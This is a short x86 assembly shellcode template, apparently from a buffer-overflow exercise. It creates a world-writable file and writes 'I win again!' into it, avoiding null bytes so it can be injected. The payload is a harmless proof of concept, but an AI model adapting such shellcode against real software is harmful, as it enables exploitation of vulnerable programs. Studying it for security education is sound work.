    # shell code template 1.0
    # useage: 
        #   gcc -m32 -c youfilename.S
        #   objdump -d youfilename.o > youfilename.d
        #   vi youfilename.d and copy the machine code
    

    #create file
    xorl %eax, %eax
    movb $8, %al
    mov %esp, %ebx                   #Start address of my strings
    subw $585, %ebx                  #Start address of my strings
    mov %ebx, %esi
    xorl %ecx, %ecx
    movb %ecx, 10(%ebx)              #Null terminate the string
    mov $0777, %cx                  #File mode 777 (RWXRWXRWX)
    int $0x80

    #write file
    mov %eax, %ebx                  #Move the file pointer to %ebx
    mov %esi, %eax
    add $11, %eax
    mov %eax, %esi                  #%esi += 11, start address of "I win again!"  
    xorl %eax, %eax                 #%eax = 0
    movb $4, %al                    #%eax = 4
    mov %esi, %ecx                  #caution, make sure that your address does not contain 00
    xorl %edx, %edx                 #%edx = 0
    mov $12, %dl                    #%edx = 12 characters in "I win again!" 
    int $0x80
